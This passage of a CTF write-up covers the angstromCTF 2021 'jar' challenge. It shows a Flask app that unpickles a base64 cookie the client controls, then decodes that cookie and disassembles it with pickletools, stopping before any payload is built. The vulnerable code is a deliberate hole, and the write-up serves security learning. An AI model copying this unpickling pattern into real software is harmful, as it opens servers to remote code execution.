https://files.actf.co/fbb50c51e4eb57abfac63ea2000aad91a62b804d0e6be1d7b95ba369af0f1d1c/pickle.jpg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">docker</span><span class="token plain"> build </span><span class="token builtin class-name">.</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-t</span><span class="token plain"> ctf2021-web-jar</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:#36acaa">--net</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">host</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5000</span><span class="token plain">:5000 </span><span class="token variable" style="color:#36acaa">$IMAGE_ID</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>And loaded the application on my browser:</p>
<p><img decoding="async" loading="lazy" alt="app_load" src="https://kbbgl.github.io/assets/images/app_load-cd224a65e8401934414d4d0623f48b2c.png" width="1918" height="1015" class="img_ev3q"></p>
<p>We’re introduced to a stretched-out image of the pickle and an input box. Adding any text to the input box generates a REST API POST request to the Flask server and adds a text node over the pickle image:</p>
<p><img decoding="async" loading="lazy" alt="tests" src="https://kbbgl.github.io/assets/images/tests-28f40c93b02b7f840d8c399aba9cc4f5.png" width="1915" height="1014" class="img_ev3q"></p>
<p>I added 3 text for testing purposes: ‘admin’, 'test2’, ‘really ugly ui’ (I hope you agree that it is).</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="reviewing-the-flask-server-code">Reviewing the Flask Server Code<a href="https://kbbgl.github.io/blog/angstrom-ctf2021-exploiting-python-pickle-in-flask#reviewing-the-flask-server-code" class="hash-link" aria-label="Direct link to Reviewing the Flask Server Code" title="Direct link to Reviewing the Flask Server Code">​</a></h2>
<p>The Flask server code is pretty simple. It has 3 routes:</p>
<ul>
<li><code>GET /</code> - The root path.</li>
<li><code>GET ./pickle.jpg</code> - Sends back the image to the frontend.</li>
<li><code>POST /add</code> - The path where the payload is sent when a new word is added in the input box.</li>
</ul>
<p>I focused my attention on the latter two routes as the exploit was likely to be found there. Here’s the code for both:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token decorator annotation punctuation" style="color:#393A34">@app</span><span class="token decorator annotation punctuation" style="color:#393A34">.</span><span class="token decorator annotation punctuation" style="color:#393A34">route</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'/'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">jar</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    contents </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> request</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">cookies</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'contents'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> contents</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> items </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pickle</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">loads</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">base64</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">b64decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">contents</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> items </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'&lt;form method="post" action="/add" style="text-align: center; width: 100%"&gt;&lt;input type="text" name="item" placeholder="Item"&gt;&lt;button&gt;Add Item&lt;/button&gt;&lt;img style="width: 100%; height: 100%" src="/pickle.jpg"&gt;'</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">''</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f'&lt;div style="background-color: white; font-size: 3em; position: absolute; top: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">random</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">.</span><span class="token string-interpolation interpolation">random</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation operator" style="color:#393A34">*</span><span class="token string-interpolation interpolation number" style="color:#36acaa">100</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">%; left: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">random</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">.</span><span class="token string-interpolation interpolation">random</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation operator" style="color:#393A34">*</span><span class="token string-interpolation interpolation number" style="color:#36acaa">100</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">%;"&gt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">item</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&lt;/div&gt;'</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> item </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> items</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token decorator annotation punctuation" style="color:#393A34">@app</span><span class="token decorator annotation punctuation" style="color:#393A34">.</span><span class="token decorator annotation punctuation" style="color:#393A34">route</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'/add'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> methods</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">'POST'</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">add</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    contents </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> request</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">cookies</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'contents'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> contents</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> items </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pickle</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">loads</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">base64</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">b64decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">contents</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> items </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    items</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">append</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">request</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">form</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">'item'</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    response </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> make_response</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">redirect</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'/'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    response</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">set_cookie</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'contents'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> base64</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">b64encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pickle</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dumps</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">items</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> response</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The root route basically retrieves the client cookie named contents and returns  hardcoded HTML back to the client with a list of items (or an empty list if there are no items).</p>
<p>The <code>/add</code> route is responsible for appending a new item to the list of items and setting the cookie.
What is common to both methods/routes is that they both decode the <code>base64</code> cookie and load/dump using the <code>pickle</code> library.</p>
<p>I’ve worked with the <a href="https://docs.python.org/3/library/pickle.html" target="_blank" rel="noopener noreferrer"><code>pickle</code></a> library before but not to the extent that I understood completely how it worked. So I turned to the official documentation to review how it performs its de/serialization.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="pickle-research-and-breakthrough"><code>pickle</code> Research and Breakthrough<a href="https://kbbgl.github.io/blog/angstrom-ctf2021-exploiting-python-pickle-in-flask#pickle-research-and-breakthrough" class="hash-link" aria-label="Direct link to pickle-research-and-breakthrough" title="Direct link to pickle-research-and-breakthrough">​</a></h2>
<p>The first thing I noticed when I accessed the pickle documentation was the following big red warning sign:</p>
<blockquote>
<p>The <code>pickle</code> module is not secure. Only un<code>pickle</code> data you trust.
It is possible to construct malicious pickle data which will <strong>execute arbitrary code during unpickling</strong>. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.</p>
</blockquote>
<p>Sounds like this is where we should focus on. If we review the Flask server code, the logic inside the method serving the root path (<code>def jar</code>) <code>base64</code> decodes the cookie and loads it using the <code>pickle</code> module. This means that if we can somehow tamper with the cookie, we could potentially generate a malicious payload to break the app and capture the flag.
We can access the cookie from the browser using JavaScript:</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">document</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">cookie</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">"contents=gASVJgAAAAAAAABdlCiMBWtvYmJplIwFdGVzdDKUjA5yZWFsbHkgdWdseSB1aZRlLg=="</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">document</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">cookie</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"="</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">"gASVJgAAAAAAAABdlCiMBWtvYmJplIwFdGVzdDKUjA5yZWFsbHkgdWdseSB1aZRlLg=="</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Since we know that this string representing the cookie is <code>base64</code> (not only because of the Python code we reviewed but also because it has the famous ‘==‘ suffix), we can decode it and understand it’s structure.
I saved the string into a file called <code>cookie</code> and proceeded to <code>base64</code> decoded it and pipe it into another file called <code>cookie_decoded</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"gASVJgAAAAAAAABdlCiMBWtvYmJplIwFdGVzdDKUjA5yZWFsbHkgdWdseSB1aZRlLg=="</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> cookie</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">base64 </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> cookie </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> cookie_decoded</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>When printing the contents of <code>cookie_decoded</code>, the output had the text I’ve added to the input field surrounded by some unrecognizable characters:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> cookie_decoded</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">��</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">�</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">�kobbi��test2��really ugly ui�e.%</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So it seems that there’s another layer of decoding to the file. Upon further research, I found a <a href="https://docs.python.org/3/library/pickletools.html" target="_blank" rel="noopener noreferrer">set of tools called <code>pickletools</code></a> that were able to disassemble a pickle file, which is what I believed I had in the string representation of <code>cookie_decoded</code>.
I ran the following command to understand how to work with <code>pickletools</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> pickletools</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">usage: pickletools.py </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-h</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-o OUTPUT</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-m</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-l INDENTLEVEL</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-a</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-p PREAMBLE</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-t</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-v</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">pickle_file </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">disassemble one or </span><span class="token function" style="color:#d73a49">more</span><span class="token plain"> pickle files</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">positional arguments:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  pickle_file           the pickle </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># ...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So it looks like it accepts a file as a positional argument. Therefore I ran:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> pickletools cookie_decoded</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">: </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">x80 PROTO      </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">2</span><span class="token plain">: </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">x95 FRAME      </span><span class="token number" style="color:#36acaa">38</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token number" style="color:#36acaa">11</span><span class="token plain">: </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">    EMPTY_LIST</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token number" style="color:#36acaa">12</span><span class="token plain">: </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">x94 MEMOIZE    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">as </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token number" style="color:#36acaa">13</span><span class="token plain">: </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">    MARK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token number" style="color:#36acaa">14</span><span class="token plain">: </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">x8c     SHORT_BINUNICODE </span><span class="token string" style="color:#e3116c">'kobbi'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token number" style="color:#36acaa">21</span><span class="token plain">: </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">x94     MEMOIZE    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">as </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token number" style="color:#36acaa">22</span><span class="token plain">: </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">x8c     SHORT_BINUNICODE </span><span class="token string" style="color:#e3116c">'test2'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token number" style="color:#36acaa">29</span><span class="token plain">: </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">x94     MEMOIZE    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">as </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token number" style="color:#36acaa">30</span><span class="token plain">: </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">x8c     SHORT_BINUNICODE </span><span class="token string" style="color:#e3116c">'really ugly ui'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token number" style="color:#36acaa">46</span><span class="token plain">: </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">x94     MEMOIZE    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">as </span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token number" style="color:#36acaa">47</span><span class="token plain">: e        APPENDS    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">MARK at </span><span class="token number" style="color:#36acaa">13</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token number" style="color:#36acaa">48</span><span class="token plain">: </span><span class="token builtin class-name">.</span><span class="token plain">    STOP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">highest protocol among opcodes </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>To translate the output, I needed to review the <a href="https://github.com/python/cpython/blob/master/Lib/pickletools.py" target="_blank" rel="noopener noreferrer">pickletools source code</a>. The most important parts of the source file are in the comments and describe the data structure of the <code>pickle</code> and are included below:</p>
<blockquote>
<p>"A pickle" is a program for a virtual pickle machine (PM, but more accurately called an unpickling machine).  It's a sequence of opcodes, interpreted by the PM, building an arbitrarily complex Python object.</p>
</blockquote>
<blockquote>
<p>Opcodes are executed once each, from first to last, until a STOP opcode is reached.</p>
</blockquote>
<blockquote>
<p>The PM has two data areas, "the stack" and "the memo".</p>
</blockquote>
<blockquote>
<p>Many opcodes push Python objects onto the stack</p>
</blockquote>
<blockquote>
<p>Other opcodes take Python objects off the stack.  The result of unpickling is whatever object is left on the stack when the final STOP opcode is executed.</p>
</blockquote>
<blockquote>
<p>The memo is simply an array of objects, or it can be implemented as a dict mapping little integers to objects.  The memo serves as the PM's "long term memory", and the little integers indexing the memo are akin to variable names.  Some opcodes pop a stack object into the memo at a given index, and others push a memo object at a given index onto the stack again.</p>
</blockquote>
<blockquote>
<p>opcodes description
<code>PROTO</code> - A way for a pickle to identify its protocol.
